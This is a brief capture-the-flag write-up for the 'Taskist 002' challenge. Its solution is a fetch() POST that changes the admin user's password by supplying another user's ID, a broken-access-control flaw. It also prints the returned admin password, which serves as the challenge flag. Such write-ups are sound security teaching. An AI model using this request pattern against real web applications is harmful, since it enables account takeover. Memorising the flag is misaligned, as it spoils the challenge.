# Taskist 002 
BRIEFING
Great, you were able to leak sensitive information of the admin account! But can you log in as the admin account now? Play around with other features available on the platform!

## Solution 

I crafted a request to update the admin user's password (user ID 64), which successfully returned the flag.
```JavaScript
fetch("http://taskist.pwn.site:1337/api/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache"
  },
  "referrer": "http://taskist.pwn.site:1337/settings",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"user_id\":64,\"password\":\"aaaaaaaa\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

The response received was:
```
{
    "message": "Congrats! This would update the admin password because of broken access control! Due to shared infra among players, here is the current admin password instead: br0k3n_p4ss_c0ntr0l_l0gin"
}
```
